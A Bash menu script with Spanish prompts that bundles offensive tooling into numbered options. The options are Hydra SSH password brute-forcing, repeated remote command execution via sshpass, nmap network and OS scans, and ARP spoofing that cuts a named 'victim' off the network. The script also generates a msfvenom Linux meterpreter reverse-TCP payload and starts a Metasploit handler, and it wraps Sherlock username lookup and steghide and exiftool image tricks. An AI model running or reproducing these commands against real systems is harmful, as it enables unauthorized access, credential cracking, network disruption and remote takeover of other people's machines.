#!/bin/bash

clear;

#opcion=0

while [ opcion!=0 ]
do
      clear;
      echo " ";
      echo " ----------------------------------------------------------";
      echo "|                  (っ◔◡◔)っ  Menu                         |";
      echo "|----------------------------------------------------------|";
      echo "|                         OPCIONES                         |";
      echo "|----------------------------------------------------------|";
      echo "| 20 - Salir                                               |";
      echo "| 16 - Borrar metadatos (no borra todos)                   |";
      echo "| 15 - Cambiar metadato de archivo                         |";
      echo "| 14 - Ver metadatos de un archivo                         |";
      echo "| 13 - Extraer texto de imagen                             |";
      echo "| 12 - Fusionar texto a imagen                             |";
      echo "| 11 - Mostrar contenido oculto de una imagen              |";
      echo "| 10 - Añadir contenido a una imagen                       |";
      echo "|  9 - Ejecutar Exploit                                    |";
      echo "|  8 - Crear Exploit                                       |";
      echo "|  7 - Sherlock                                            |";
      echo "|  6 - Restablecer red                                     |";
      echo "|  5 - Dejar sin red                                       |";
      echo "|  4 - Ver S.O de un equipo                                |";
      echo "|  3 - Nmap toda la red                                    |";
      echo "|  2 - SSH DirectAT                                        |";
      echo "|  1 - Hydra SSH                                           |";
      echo "|  0 - Instalar dependencias                               |";
      echo " ----------------------------------------------------------";
      read -p "Escoge opcion: " opcion;


      case $opcion in
	
	0)
	echo "ACTUALIZANDO LIBRERIAS"
	sleep 2
	sudo apt update
	echo "INSTALANDO curl"
	sleep 2
	sudo apt install --yes curl
	echo "INSTALANDO metasploit"
	sleep 2
	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
	chmod +x msfinstall && sudo ./msfinstall
	echo "INSTALANDO Hydra"
	sleep 2
	sudo apt install --yes hydra
	echo "INSTALANDO NMAP"
	sleep 2
	sudo apt install --yes nmap
	echo "INSTALANDO DSNIFF"
	sleep 2
	sudo apt install --yes dsniff
	echo "INSTALANDO SSH"
	sleep 2
	sudo apt install --yes ssh
	echo "INSTALANDO NFTABLES"
	sleep 2
	sudo apt install --yes nftables 
	echo "INSTALANDO EXIFTOOL"
	sleep 2
	sudo apt install --yes libimage-exiftool-perl
	echo "INSTALANDO STEGHIDE"
	sleep 2
	sudo apt install --yes steghide
	echo "INSTALANDO SHERLOCK"
	sleep 2
	git clone https://github.com/sherlock-project/sherlock.git
	python3 -m pip install -r sherlock/requirements.txt
	;;
        1)
	clear
	read -p "Usuario: " usuario
	read -p "IP: " ip

	hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh
	;;

        2)
	clear
	read -p "Dime la contraseña: " contra
	read -p "Dime el usuario: " usu
	read -p "Dime la IP: " ip
	read -p "Que comando quieres usar: " comand

	watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "
	;;

 	3)
	clear
	read -p "Dime el nombre de la Red: " red
	read -p "Parametros? (T4,sP): " parametro

	nmap -$parametro $red/24
	sleep 60
	;;
	4)
	clear
	read -p "Dime el equipo que quieres comprobar: " eq

	nmap -T4 -O $eq
	;;

	5)
	#read -p "Dime la ip del gateway: " gateway
	read -p "Dime la ip de la victima: " victima

	arpspoof -t 192.168.12.10 $victima 2> /dev/null &
	arpspoof -t $victima 192.168.12.10 2> /dev/null &
	sysctl net.ipv4.ip_forward=1
	nft -f redir80443.txt
	;;
	
	6)
	killall arpspoof
	;;
	7)
	read -p "Dime el usuario que quieres investigar: " usr

	cd sherlock
	python3 sherlock $usr
	sleep 60
	cd ..
	;;
	8)

	read -p "Dime como quieres que se llame el exploit: " exp
	read -p "Dime tu IP: " ip
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o ~/$exp
	;;

	9)
	read -p "Dime tu dirección IP: " ip
	echo "use exploit/multi/handler" > exploit.rc
	echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> exploit.rc
	echo "set LHOST $ip" >> exploit.rc
	echo "run" >> exploit.rc

	msfconsole -q -r exploit.rc
	;;
	10)
	read -p "Dime el texto que quieres meter en una imagen: " texto
	read -p "Dime el nombre de la imagen: " nimagen
	read -p "Dime el nombre de la imagen Final: " fimagen
	echo "$texto" > .topsecret.txt && cat $nimagen .topsecret.txt > $fimagen
	;;
	11)
	read -p "Dime nombre de la imagen: " img
	strings $img	
	sleep 10
	;;
	12)
	read -p "Dime el texto que quieres meter en una imagen: " texto
	read -p "Dime el nombre de la imagen: " nimagen
	read -p "Dime el nombre del archivo oculto O si el nombre de uno que quieras utilizar: " arch
	
	echo $texto > $arch 
	steghide embed -ef $arch -cf $nimagen
	;;
	13)
	read -p "Dime nombre del archivo: " img
	steghide extract -sf $img	
	sleep 5
	;;
	14)
	read -p "Dime nombre del archivo: " img
	exiftool -s $img
	sleep 10
	;;
	15)
	read -p "Dime nombre del archivo: " arch
	read -p "Dime el nombre del metadato que quieres modificar: " meta
	read -p "Dime el nuevo valor que quieres añadirle: " valor
	exiftool -$meta=$valor $arch
	;;
	16)
	read -p "Dime el del archivo: " arch
	exiftool -all= $arch
	;;
	
	20)
		exit
	;;

esac
done

